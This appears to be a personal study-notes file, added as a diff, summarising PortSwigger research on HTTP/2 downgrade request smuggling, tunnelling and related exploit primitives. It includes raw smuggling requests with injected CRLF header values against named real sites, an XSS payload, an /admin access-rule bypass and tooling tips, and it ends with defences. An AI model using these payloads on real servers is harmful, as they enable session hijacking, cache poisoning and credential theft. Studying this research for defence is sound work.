@@ -1,0 +1,474 @@
+https://portswigger.net/research/http2
+https://blackhat.com/archive/usa/2021/briefings/schedule/#http2-the-sequel-is-always-worse-22668
+
+
+Introduction:
+- HTTP/2-exclusive threat caused by both implementation flaw and RFC imperfections
+- These achieve critical impact by hijacking clients, poisoning caches, and stealing credential to net multiple max-bounties
+- Reveal some techniques and tools to crack open desync-powered request tunnelling - a widespread but overlooked request smuggling variant that is typically mistaken for a false positive
+- Share new exploit-primitive introduced by HTTP/2
+
+
+HTTP/2 for Hackers
+- Although HTTP/2 is complex, it's designed to transmit the same information as HTTP/1.1.
+- Equivalent between 2 protocol:
+    + HTTP/1.1:
+        POST /login HTTP/1.1\r\n
+        Host: psres.net\r\n
+        User-Agent: burp\r\n
+        Content-Length: 9\r\n
+        \r\n
+        x=123&y=4
+    + HTTP/2:
+        :method	    POST
+        :path	    /login
+        :authority	psres.net
+        :scheme	    https
+        user-agent	burp
+        x=123&y=4
+- Only 3 new concepts need to learn:
+    + Pseudo-Headers:
+        + Replace request line with a series of pseudo-headers using colon at the start of the name       
+    + Binary Protocol:
+        + HTTP/1 is text based protocol -> parse using string operations (find \r\n or :) -> ambiguity possible
+            {Header-Name}: {Header-Value}\r\n
+        + HTTP/2 is binary protocol like TCP -> parse by predefined offsets -> less ambiguity
+            [name_length=11][name_bytes][value_length=12][value_bytes]
+        + Note:
+            + Paper represents using human-readable rather than actual bytes
+            + Example: on wire, pseudo-header names are actually mapped to single byte - don't really contain a colon
+    + Message Length:
+        + HTTP/1: body length is indicated via CL or TE header
+        + HTTP/2: body length is composed of data frames which have built-in length field, CL/TE are redundant here
+        -> Mean that there's little room for ambiguity body length in HTTP/2
+        + Desync attack is possible by HTTP/2 downgrading
+
+
+HTTP/2 Desync Attacks
+- Request Smuggling via HTTP/2 Downgrades:
+    + When FE speaks HTTP/2 but rewrite into HTTP/1.1 before forwarding them to BE server
+    -> HTTP/2 almost use built-in message length, but BE receive downgrade request doesn't have access to this data, and must use CL or TE header
+    -> Lead to H2.TE an H2.CL
+- Case studies:
+    + H2.CL Desync on Netflix: (CVE-2021-21295)
+        + Attacker request:
+            :method	        POST
+            :path	        /n
+            :authority	    www.netflix.com
+            content-length	4
+            abcdGET /n HTTP/1.1
+            Host: 02.rs?x.netflix.com
+            Foo: bar
+            + FE: forward all request without verify CL, only tryst data frame length
+            + BE: receive downgraded HTTP/1.1 request -> read CL=4
+        + By redirect to arbitrary JS file -> could compromise Netflix accounts, steal passwords and credit card numbers
+    + H2.TE Desync on Application Load Balancer:
+        + RFC: "any message containing connection-specific header fields MUST be treated as malformed"
+        + Vuln: AWS Load Balancer failed to obey this line and accept TE header -> H2.TE desync
+        + Attacker request:
+            :method	            POST
+            :path	            /identitfy/XUI
+            :authority	        id.b2b.oath.com
+            transfer-encoding	chunked
+            0
+
+            GET /oops HTTP/1.1
+            Host: psres.net
+            Content-Length: 10
+
+            x=
+        + Impact in real web:
+            + Steal user secret code (OAuth) via Referer header
+            + Redirect users to attacker's domain
+    + H2.TE via Request Header Injection:
+        + In HTTP/1, impossible to put certain parsing-critical characters in certain place
+            + Example: can't put extra \r\n in header, would terminate header
+                Host: test.com\r\n\r\n
+        + In HTTP/2, binary protocol -> enable put arbitrary char in arbitrary place
+            + Example:
+                foo     b\r\n
+                        transfer-encoding:chunked
+            + RFC: "Any request that contains a character not permitted in a header field value MUST be treated as malformed"
+            + Many skip validation
+            + It is expected to re-impose HTTP/1 style restriction with extra validation step
+        + Netlify CDN was vuln:
+            + Allow H2.TE desync and inject TE header via \r\n
+                :method     POST
+                :path       /
+                :authority  start.mozilla.org
+                foo         b\r\ntransfer-encoding: chunked
+                0\r\n
+                \r\n
+                GET / HTTP/1.1\r\n
+                Host: evil-netlify-domain\r\n
+                Content-Length: 5\r\n
+                \r\n
+                x=
+    + H2.X via Request Splitting:
+        + Instead of only \r\n, use \r\n\r\n to terminate request
+            :method     GET
+            :path       /
+            :authority	ecosystem.atlassian.net
+            foo	        bar
+                        Host: ecosystem.atlassian.net
+
+                        GET /robots.txt HTTP/1.1
+                        X-Ignore: x
+            + This technique avoided need for TE header, message body and POST method
+        + After downgrade, FE append \r\n\r\n to terminate request
+            -> BE sees exactly 2 complete standalone request
+                GET / HTTP/1.1
+                Foo: bar
+                Host: ecosystem.atlassian.net
+
+                GET /robots.txt HTTP/1.1
+                X-Ignore: x
+                Host: ecosystem.atlassian.net\r\n
+                \r\n
+        + Impact: reponse queue poisoning
+            + Response received sent to next user, FE serves each user the response to the previous user's request
+                Req1 -> Resp1
+                Req2
+
+                Req3 -> Resp2
+
+                Req4 -> Resp3
+
+                ...  -> Resp4
+        + This vuln occur in Atlassian's Jira:
+            + Some of these contained Set-Cookie headers that persistently logged users into other user's acc
+            + Atlassian must deploy a hotfix, globally expired all user session
+    + H2.TE via Header Name Injection:
+        + Atlassian tried to disallow newline in header value, but failed to filter header names
+            :method	                        POST
+            :path	                        /
+            :authority	                    ecosystem.atlassian.net
+            foo: bar\r\ntransfer-encoding   chunked
+            
+
+            GET / HTTP/1.1
+            foo: bar
+            transfer-encoding: chunked
+            host: ecosystem.atlassian.net
+    + H2.TE via Request Line Injection:
+        + It didn't filter pseudo-headers
+            :method	    GET / HTTP/1.1
+                        Transfer-encoding: chunked
+                        x: x
+            :path	    /ignored
+            :authority	ecosystem.atlassian.net
+
+            GET / HTTP/1.1
+            transfer-encoding: chunked
+            x: x /ignored HTTP/1.1
+            Host: eco.atlassian.net
+        + But patch only block \r\n, \n alone is enough to exploit
+
+
+Desync-Powered Request Tunnelling:
+- FE decide whether to route it to existing connection or establish new connection to BE
+- FE connection-reuse strategy determine which attack are possible:
+    + Share connection (most common): any request goes down any connection
+        -> Enable cross-user attack
+    + Per-IP connection: prefix only affect request from same IP
+        -> Attack other users via cache poisoning
+    + One-to-one (client - BE): stringer restriction
+        -> Cache poisoning + internal header leaking still work
+    + No connection reuse: FE create new connection per request
+        -> Can't affect subsequent request at all
+- When no connection reuse -> only exploit primitive left -> request tunnelling attack
+    + Attacker can smuggle extra request into same connection, but response only come back to attacker (no cross-user poisoning)
+    + Can arise from H2C smuggling
+        https://bishopfox.com/blog/h2c-smuggling-request
+
+- Tunnelling Confirmation:
+    + Detection: timeout technique work fine (same as HTTP/1)
+    + Confirmation: (hard)
+        + Normal process: send attacker + victim request, check if early request affect the later one
+        + Always fail, easy to mistake for false positive
+    + Naive approach: smuggle complete request, check for 2 response
+        POST / HTTP/1.1
+        Host: example.com
+        Transfer-Encoding: chunked
+
+        0
+
+        GET / HTTP/1.1
+        Host: example.com
+
+
+        ------------------------
+        HTTP/1.1 301 Moved Permanently
+        Content-Length: 162
+        Location: /en
+
+        <html><head><title>301 Moved…
+
+        HTTP/1.1 301 Moved Permanently
+        Content-Length: 162…
+
+        + Problem: 
+            + In HTTP/1.1, concat multiple response is just how keep-alive work and doesn't prove anything
+            + 2 possibility:
+                + First (vuln):
+                    + FE send 1 request, BE see 2 -> return 2 response
+                    + FE expect only 1 response -> read both as single response
+                + Second (safe):
+                    + FE send 2 request, BE see 2 -> return 2 response
+                    + FE expect 2 response -> read 2 response separately (HTTP/1.1 keep-alive)
+                    -> No desync
+            + Both case output identical output -> can't confirm using HTTP/1.1
+        + Solution: use HTTP/2 to confirm
+            :method	POST
+            :path	/
+            :authority	example.com
+            transfer-encoding	chunked
+
+            0
+
+            GET / HTTP/1.1
+            Host: example.com
+            ---------------------------
+            :status	    301
+            location	/en
+            <html><head><title>301 Moved…
+
+            HTTP/1.1 301 Moved Permanently
+            Content-Length: 162…
+
+
+            + HTTP/2 has clear response boundary (each response = separate stream)
+            + If safe: return 2 separate response (2 stream)
+            + If vuln: return 1 response with HTTP/1 headers inside body
+- Tunnel Vision:
+    + Problem: FE often uses CL on BE response to decide how many bytes to read from socket
+        + Even 2 requests hit BE -> Still has chance that only return first response
+    + Solution: HEAD method trick
+        + HEAD method return response headers but omits body
+        + Some bytes in second response will be leaked
+    + Tips:
+        + May need few attempt because of timing sensitive socket read
+        + Smuggle invalid request is better for detection (faster response and force BE close connection -> avoid accidental response queue poisoning)
+            HEAD / HTTP/1.1
+            Transfer-Encoding: chunked
+
+            0
+
+            H A X
+        + If HEAD fail, can try OPTIONS, POST or GET
+        + If target is only vuln to tunnelling -> don't have to worry about queue poisoning
+- Tunnelling Exploitation: Guessing Internal Headers:
+    + This technique let you hit BE with request that completely unprocessed by FE
+    + Exploit path 1: Bypass FE security rules (path restriction)
+        + Example: FE forbidden 403 when see path /admin
+            + Smuggle a GET /admin inside valid request
+            + FE pass to BE without knowing it -> bypass
+    + Exploit path 2: smuggle internal headers
+        + FE often inject internal header when forward request
+        + If attacker know the header and try to inject manual -> FE detect and rewrite it to default -> Fail
+        + Can guess header through smuggle request or bruteforce by tool
+        + Tunnelling can bypass this (cuz it not go through FE)
+- Tunnelling Exploitation: Leaking Internal Headers:
+    + Problem: internal header name is not in wordlist, regular smuggling can leak headers but doesn't work for tunnelling
+    + Solution: instead of disagreement about where body end, we can cause it disagreement aout where body start
+        + In HTTP/2, inject \r\n\r\n in header value -> FE and BE disagree on header boundary
+        + Example:
+            :method	    POST
+            :path	    /blog
+            :authority	bitbucket.org
+            foo	        bar\r\n
+                        Host: bitbucket.wpengine.com\r\n
+                        Content-Length: 200\r\n
+                        \r\n
+                        s=cow
+
+            foo=bar
+        + After being downgrade to HTTP/1.1:
+            POST /blog HTTP/1.1
+            Foo: bar
+            Host: bitbucket.wpengine.com
+            Content-Length: 200
+
+            s=cow
+            SSLClientCipher: TLS_AES_128
+            Host: bitbucket.wpengine.com
+            Content-length: 7
+
+            foo=bar
+        + Both FE + BE think user only sent 1 request, but confuse where the body start
+            + FE think 's=cow' is part of header -> so insert the internal header adter that
+            + BE think 's=cow' is start of body -> internal headers become part of POST paranm
+        + Work even if tunnelling is blind (only 1 response from BE)
+        + Different path may lead to different BE -> leak different headers
+- Tunnelling Exploitation: Cache Poisoning:
+    + Require: request tunnelling via H2.X desync + HEAD technique work + cache present
+    + Technique: use HEAD method to poison cache by mix and match arbitrary headers and bodies
+    + Example in Bitbucket:
+        + Access /wp-admin -> trigger redirect and reflect user input inside Location header without encoding it
+        + Pairing with response header from /blog/404 -> trick browser into rendering it and executing arbitrary JS
+            :method	    HEAD
+            :path	    /blog/?x=dontpoisoneveryone
+            :authority	bitbucket.org
+            foo	        bar
+                        Host: x
+
+                        GET /wp-admin?<svg/onload=alert(1)> HTTP/1.1
+                        Host: bitbucket.wpengine.com
+            --------------------------------------------------------
+            HTTP/1.1 404 Not Found
+            Content-Type: text/html
+            X-Cache-Info: cached
+            Content-Length: 5891
+
+            HTTP/1.1 301 Moved Permanently
+            Location: https://bitbucket.org/wp-admin/?<svg/onload=alert(1)>
+        + Browser see Content-Type: text/html -> render Location as HTML -> XSS execute
+        + Combine with cached -> persistent control over every page
+
+
+HTTP/2 Exploit Primitives:
+- Some behavior based on real website
+- Ambiguity and HTTP/2:
+    + HTTP/1: can't send request with multiple methods or paths
+    + HTTP/2: 
+        + pseudo-headers replace request line -> Possible to duplicate :path
+            :method	    GET
+            :path	    /some-path
+            :path	    /different-path
+            :authority	example.com
+        + :authority replaces Host, but Host header still technically allowed (both optional)
+            :method	    GET
+            :path	    /
+            :authority	example.com
+            host	    attacker.com
+- URL Prefix Injection:
+    + In HTTP/2, :scheme pseudo-header meant to be http or https, but it also support arbitrary bytes
+    + Netlify uses it to construct URL without any validation -> can override path, poison the cache
+        :method	    GET
+        :path	    /ffx36.js
+        :authority	start.mozilla.org
+        :scheme	    http://start.mozilla.org/xyz?
+        -------------------
+        HTTP/1.1 301 Moved Permanently
+        Location: https://start.mozilla.org/xyz?://start.mozilla.org/ffx36.js
+    + Other uses :scheme to build routing URL -> SSRF
+    + Can work even HTTP/2 not downgrading
+- Header Name Splitting:
+    + Some servers don't let you use \n in header name, but allow colons
+    -> Rarely enable full desynchronization, due to trailing colon append during downgrade
+        :method	                    GET
+        :path	                    /
+        :authority	                redacted.net
+        transfer-encoding: chunked	
+        ----------------------------
+        GET / HTTP/1.1
+        Host: redacted.net
+        transfer-encoding: chunked: 
+    + Also suitable for Host-header attack, since Host expect to contain a colon, server often ignore everything after colon
+        :method	        GET
+        :path	        /
+        :authority	    example.com
+        host: psres.net	443
+        ------------------------------
+        GET / HTTP/1.1
+        Host: example.com
+        Host: psres.net: 443
+- Request Line Injection:
+    + Example: Apache
+        + Apache's mod_proxy allow spaces in :method -> enable request line injection
+        + If BE server accept trailing junk in request line -> let bypass block rules
+            <ProxyMatch "/admin">
+                Deny from all
+            -----------------------
+            :method	    GET /admin HTTP/1.1
+            :path	    /fakepath
+            :authority	psres.net
+            ----------------------
+            GET /admin HTTP/1.1  /fakepath HTTP/1.1
+            Host: internal-server
+        + Also can use for escape subfolders: (CVE-2021-33193 patched in 2.4.49)
+            ProxyPass http://internal-server.net:8080/public
+            -----------------------
+            :method	    GET / HTTP/1.1
+            :path	    /fakepath
+            :authority	psres.net
+            ----------------------
+            GET / HTTP/1.1 /public/fakepath HTTP/1.1
+            Host: internal-server
+- Header Tampering Wrap:
+    + HTTP/1.1: had a feature called line folding, allow to put \r\n followed by a space in header value, subsequent data would be folded up
+        GET / HTTP/1.1
+        Host: example.com
+        X-Long-Header: foo bar
+        Connection: close
+        ------------------
+        GET / HTTP/1.1
+        Host: example.com
+        X-Long-Header: foo\r\n
+            bar
+        Connection: close
+    + If FE let send header name starting with space, BE support line folding -> can tamper with other headers, include internal one
+        :method	    GET
+        :path	    /
+        :authority	redacted.net
+         poison	    x
+        user-agent	burp
+        -----------------------
+        GET / HTTP/1.1
+        Host: redacted.net
+        Request-Id: 1-602d2c4b-7c9a1f0f7
+         poison: x
+        User-Agent: burp
+        ---------------------
+        HTTP/1.1 200 OK
+        Content-Type: text/html; charset=utf-8
+        Content-Length: 3705
+        Request-Id: 1-602d2c4b-7c9a1f0f7 poison: x
+    + Many FE server doesn't sort incoming header -> by moving space-header around -> can tamper different internal and external headers
+
+
+Essential Information (some pitfalls and challenges encounter when exploit HTTP/2)
+- Hidden HTTP/2:
+    + HTTP/2 and HTTP/1.1 both use same port 443, client need to determine protocol
+        + Most default is HTTP/1.1, only switch to HTTP/2 if server adverties via ALPN (Application-Layer Protocol Negotiation)field in TLS handshake.
+        + Problem: Some server forget this -> lead to client only speak HTTP/1 with them and hiding valuable attack surface
+    + Detect:
+        + Simply ignore ALPN and try to send HTTP/2 request
+        + Scan for this using HTTP Request Smuggler, Burp Scanner or curl
+            curl --http2 --http2-prior-knowledge https://target.com/
+- Connection:
+    + HTTP/2 support multiple request over a single connection
+    + Server treat first request on each connection differently -> lead to vuln appear less oven can be miss entirely
+    + On other servers, sometime request corrupt connection without causing server to tear it down -> effect all subsequent request get processed
+    + If observe any of these problems -> can turn on 'Enable HTTP/2 connection reuse' option in Burp Repeater, and requestsPerConnection setting in Turbo Intruder to avoid
+- Tooling:
+    + HTTP/2 is hard to test with most tool
+    + Normal tool:  
+        + netcat/openssl: can't type request by hand cuz HTTP/2 is binary format
+        + requests/http.client: not allow send malformed request, auto normalize
+        + curl and some existing library: not allow send malformed request
+        + Hard to create a handmade tool, HTTP/2 is too complex
+    + James Kettle started research by coding new open-source HTTP/2 stack from scratch, then integrating into Turbo Intruder
+        + Invoke by change engine=Engine.THREADED --> engine=Engine.HTTP2
+        + It takes HTTP/1.1 formatted request as input, then rewrite as HTTP/2
+        + During rewrite, perform a few mapping on headers to ensure all techniques used in this presentation are possible
+            ^ -> \r
+            ~ -> \n
+            ` -> :
+        + Also can override pseudo-headers by specifying them as fake HTTP/1.1 headers. Example in Apache
+            GET /fakepath HTTP/1.1
+            Host: example.com
+            :method: GET /admin HTTP/1.1
+    + Note:
+        + If Turbo Intruder HTTP/2 stack is not work on target, should try Burp Suite native HTTP/2 stack. More battle-tested and can invoke via Engine.BURP2
+        + HTTP Request Smuggler: major update, found all case studies in paper
+- Burp Suite:
+- Defence:
+    + Avoid HTTP/2 downgrading (root cause) and use HTTP/2 end to end
+    + If coding HTTP/2 server with downgrading support
+        + Enforce harset limit present in HTTP/1 - reject request contain newlines in headers, colons in header names, space in request method,...
+    + RFC specification not always explicit about where vulns may aris, some unmarked requirements if skipped will cause critical vuln
+    + Web dev are advised not to assume HTTP/1 validation rule still hold in HTTP/2
+- Further Reading:
+    + https://www.slideshare.net/slideshow/http-request-smuggling-via-higher-http-versions/248407775
+    + https://www.youtube.com/watch?v=3tpnuzFLU8g
